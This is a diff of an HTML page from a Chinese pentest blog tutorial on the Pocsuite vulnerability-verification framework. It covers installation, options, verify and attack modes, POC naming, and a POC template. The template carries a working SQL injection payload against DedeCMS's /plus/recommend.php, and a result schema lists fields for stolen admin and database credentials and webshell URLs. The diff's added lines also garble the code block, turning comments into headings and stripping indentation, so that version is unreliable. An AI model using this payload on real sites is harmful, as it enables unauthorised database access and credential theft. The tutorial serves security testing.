@@ -82,23 +82,19 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/tools">tools</a>)
 </div>
 
-      <div>
-
-<h3 id="0x00-关于pocsuite">0x00 关于Pocsuite</h3>
-
+      <div><h3 id="0x00-关于pocsuite">0x00 关于Pocsuite</h3>
 <p>Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。</p>
-
 <h3 id="0x01-简单介绍">0x01 简单介绍</h3>
-
 <ul>
-<li>安装
-
+<li>
+<p>安装</p>
 <ul>
 <li>使用pip install pocsuite即可安装
-<img src="/img/post/pocsuite_install.png" alt="安装pocsuite" /></li>
-</ul></li>
-<li>常用参数
-
+<img src="/img/post/pocsuite_install.png" alt="安装pocsuite"></li>
+</ul>
+</li>
+<li>
+<p>常用参数</p>
 <ul>
 <li>-u 指定一个目标url</li>
 <li>-f 指定一个存放目标url的文件</li>
@@ -107,47 +103,48 @@
 <li>&ndash;cookie 携带cookie</li>
 <li>&ndash;referer 修改referer</li>
 <li>&ndash;user-agent 修改UA</li>
-</ul></li>
-<li>模式
-
+</ul>
+</li>
+<li>
+<p>模式</p>
 <ul>
 <li>执行一个poc有两种模式
-
 <ul>
 <li>--verify 漏洞验证模式(只是验证，不能更改服务器的东西)</li>
 <li>--attack 漏洞利用模式</li>
-</ul></li>
+</ul>
+</li>
 <li>示例
-
 <ul>
 <li><code>pocsuite -u &quot;http://www.xxxx.com&quot; -r poc_path/poc_name.py --atack</code></li>
-</ul></li>
-</ul></li>
-
-<li><p>poc编写</p>
-
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>poc编写</p>
 <ul>
 <li>可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类)</li>
 <li>此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)
-
 <ul>
 <li><code>pocsuite -u &quot;http://www.xxxx.com&quot; -r poc_path/server/ --verify</code></li>
-</ul></li>
-</ul></li>
-
-<li><p>poc的命名规范</p>
-
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>poc的命名规范</p>
 <ul>
 <li>漏洞ID_版本号_漏洞类型(其中不能有大写字母，所有符号要改为<code>&quot;_&quot;</code>),大致如下：
-
 <ul>
 <li>_xxxx_struct2_2016_s2_016_code_execution.py</li>
 <li>_xxxx_dedecms_20130715_sql_inj.py</li>
-</ul></li>
-</ul></li>
-
-<li><p>poc的编写流程</p>
-
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>poc的编写流程</p>
 <ul>
 <li>导入pocsuite API模块</li>
 <li>创建TestPOC类</li>
@@ -155,126 +152,118 @@
 <li>编写_berify()方法</li>
 <li>编写_attack()方法</li>
 <li>注册类</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <h3 id="0x02-实例">0x02 实例</h3>
-
 <blockquote>
-<pre><code class="language-python">#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-# 导入pocsuite的必要模块
-from pocsuite.net import req # requests模块，和requests用法完全一样
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"></code></pre></div></blockquote>
+<p>#!/usr/bin/env python</p>
+<h1 id="---coding-utf-8---">-<em>- coding: utf-8 -</em>-</h1>
+<h1 id="导入pocsuite的必要模块">导入pocsuite的必要模块</h1>
+<p>from pocsuite.net import req # requests模块，和requests用法完全一样
 from pocsuite.poc import POCBase, Output
-from pocsuite.utils import register
+from pocsuite.utils import register</p>
+<p>class TestPOC(POCBase):
+&ldquo;&ldquo;&ldquo;docstring for TestPOC&rdquo;&rdquo;&rdquo;
+vulID            = &rsquo;&rsquo;      # VUL ID
+version          = &rsquo;&rsquo;      # 版本号,默认为1
+author           = &rsquo;&rsquo;      # POC 作者的大名
+vulDate          = &rsquo;&rsquo;      # 漏洞公开的时间,不知道就写今天
+createDate       = &rsquo;&rsquo;      # 编写 POC 的日期
+updateDate       = &rsquo;&rsquo;      # POC更新的时间,默认和编写时间一样
+references       = [&rsquo;&rsquo;]    # 漏洞地址来源,0day 不用写
+name             = &rsquo;&rsquo;      # POC 名称
+appPowerLink     = &rsquo;&rsquo;      # 漏洞厂商主页地址
+appName          = &rsquo;&rsquo;      # 漏洞应用名称
+appVersion       = &rsquo;&rsquo;      # 漏洞影响版本
+vulType          = &rsquo;&rsquo;      # 漏洞类型,类型参考见 漏洞类型规范表
+desc             = &rsquo;&rsquo;&rsquo; &rsquo;&rsquo;&rsquo; # 漏洞简要描述
+samples          = []      # 测试样例,就是用 POC 测试成功的网站url，选填
+install_requires = []      # POC 第三方模块依赖，请尽量不要使用第三方模块</p>
+<pre><code>def _verify(self, verify=True): # 漏洞测试代码
+    result = {}
+    target_url = self.url
 
-class TestPOC(POCBase):
-    &quot;&quot;&quot;docstring for TestPOC&quot;&quot;&quot;
-    vulID            = ''      # VUL ID
-    version          = ''      # 版本号,默认为1
-    author           = ''      # POC 作者的大名
-    vulDate          = ''      # 漏洞公开的时间,不知道就写今天
-    createDate       = ''      # 编写 POC 的日期
-    updateDate       = ''      # POC更新的时间,默认和编写时间一样
-    references       = ['']    # 漏洞地址来源,0day 不用写
-    name             = ''      # POC 名称
-    appPowerLink     = ''      # 漏洞厂商主页地址
-    appName          = ''      # 漏洞应用名称
-    appVersion       = ''      # 漏洞影响版本
-    vulType          = ''      # 漏洞类型,类型参考见 漏洞类型规范表
-    desc             = ''' ''' # 漏洞简要描述
-    samples          = []      # 测试样例,就是用 POC 测试成功的网站url，选填
-    install_requires = []      # POC 第三方模块依赖，请尽量不要使用第三方模块
+    # 这里写入漏洞测试代码
+    path = &quot;/plus/recommend.php&quot;
+    payload = &quot;?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select md5(512341)),5,6,7,8,9%23@`\\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294&quot;
+    html = req.get(target_url + path + payload, timeout=10).content
+    if '5e8523b1645e6225001b9027cddc1c85' in html:
+        result['VerifyInfo'] = {}
+        result['VerifyInfo']['URL'] = self.url + path
+        result['VerifyInfo']['Path'] = path
+        result['VerifyInfo']['Payload'] = payload
+    
+    return self.parse_attack(result)
 
-    def _verify(self, verify=True): # 漏洞测试代码
-        result = {}
-        target_url = self.url
+def _attack(self): # 漏洞利用代码
+    # result = {}
+    # # 先进行检测是否存在漏洞
+    # if not self._verify(verify=False):
+    #     return self.parse_attack(result)
+    # target_url = self.url
 
-        # 这里写入漏洞测试代码
-        path = &quot;/plus/recommend.php&quot;
-        payload = &quot;?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select md5(512341)),5,6,7,8,9%23@`\\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294&quot;
-        html = req.get(target_url + path + payload, timeout=10).content
-        if '5e8523b1645e6225001b9027cddc1c85' in html:
-            result['VerifyInfo'] = {}
-            result['VerifyInfo']['URL'] = self.url + path
-            result['VerifyInfo']['Path'] = path
-            result['VerifyInfo']['Payload'] = payload
-        
-        return self.parse_attack(result)
+    # # 这里写漏洞利用代码
 
-    def _attack(self): # 漏洞利用代码
-        # result = {}
-        # # 先进行检测是否存在漏洞
-        # if not self._verify(verify=False):
-        #     return self.parse_attack(result)
-        # target_url = self.url
+    # return self.parse_attack(result)
+    
+    return self._verify() # 如果没漏洞利用代码，可以直接return测试函数
 
-        # # 这里写漏洞利用代码
-
-        # return self.parse_attack(result)
-        
-        return self._verify() # 如果没漏洞利用代码，可以直接return测试函数
-
-    def parse_attack(self, result): # poc输出函数，可以输出错误和成功信息
-        output = Output(self)
-        if result:
-            output.success(result)
-        else:
-            output.fail('Nothing returned')
-        return output
-
-register(TestPOC) #注册类
+def parse_attack(self, result): # poc输出函数，可以输出错误和成功信息
+    output = Output(self)
+    if result:
+        output.success(result)
+    else:
+        output.fail('Nothing returned')
+    return output
 </code></pre>
-</blockquote>
-
-<h3 id="0x03-关于poc中result字典的内容">0x03 关于poc中result字典的内容</h3>
-
-<blockquote>
-<pre><code># result是一个字典，里面存储所有的漏洞信息:
+<p>register(TestPOC) #注册类</p>
+<pre tabindex="0"><code>
+### 0x03 关于poc中result字典的内容
+&gt; ```
+# result是一个字典，里面存储所有的漏洞信息:
 result：{
-    'DBInfo': {
-        'Username': '管理员用户名',
-        'Password'：'管理员密码',
-        'Salt': '加密盐值',
-        'Uid': '用户ID',
-        'Groupid': '用户组ID'
+    &#39;DBInfo&#39;: {
+        &#39;Username&#39;: &#39;管理员用户名&#39;,
+        &#39;Password&#39;：&#39;管理员密码&#39;,
+        &#39;Salt&#39;: &#39;加密盐值&#39;,
+        &#39;Uid&#39;: &#39;用户ID&#39;,
+        &#39;Groupid&#39;: &#39;用户组ID&#39;
         }
-    'ShellInfo': {
-        'URL': 'Webshell地址',
-        'Content': 'Webshell内容'
+    &#39;ShellInfo&#39;: {
+        &#39;URL&#39;: &#39;Webshell地址&#39;,
+        &#39;Content&#39;: &#39;Webshell内容&#39;
         }
-    'FileInfo': {
-        'Filename': '文件名称',
-        'Content': '文件内容'
+    &#39;FileInfo&#39;: {
+        &#39;Filename&#39;: &#39;文件名称&#39;,
+        &#39;Content&#39;: &#39;文件内容&#39;
         }
-    'XSSInfo': {
-        'URL': '验证URL',
-        'Payload': '验证Payload'
+    &#39;XSSInfo&#39;: {
+        &#39;URL&#39;: &#39;验证URL&#39;,
+        &#39;Payload&#39;: &#39;验证Payload&#39;
         }
-    'AdminInfo': {
-        'Uid': '管理员ID',
-        'Username': '管理员用户名',
-        'Password': '管理员密码'
+    &#39;AdminInfo&#39;: {
+        &#39;Uid&#39;: &#39;管理员ID&#39;,
+        &#39;Username&#39;: &#39;管理员用户名&#39;,
+        &#39;Password&#39;: &#39;管理员密码&#39;
         }
-    'Database': {
-        'Hostname': '数据库主机名',
-        'Username': '数据库用户名' ,
-        'Password': '数据库密码',
-        'DBname': '数据库名'
+    &#39;Database&#39;: {
+        &#39;Hostname&#39;: &#39;数据库主机名&#39;,
+        &#39;Username&#39;: &#39;数据库用户名&#39; ,
+        &#39;Password&#39;: &#39;数据库密码&#39;,
+        &#39;DBname&#39;: &#39;数据库名&#39;
         }
-    'VerifyInfo': {
-        'URL': '验证URL',
-        'Postdata': '验证POST数据',
-        'Path': '网站绝对路径'
+    &#39;VerifyInfo&#39;: {
+        &#39;URL&#39;: &#39;验证URL&#39;,
+        &#39;Postdata&#39;: &#39;验证POST数据&#39;,
+        &#39;Path&#39;: &#39;网站绝对路径&#39;
         }
-    'SiteAttr': {
-        'Process': '服务器进程'
+    &#39;SiteAttr&#39;: {
+        &#39;Process&#39;: &#39;服务器进程&#39;
         }
 }
-</code></pre>
-</blockquote>
-</div>
+</code></pre></div>
     </article>
   </main>
 
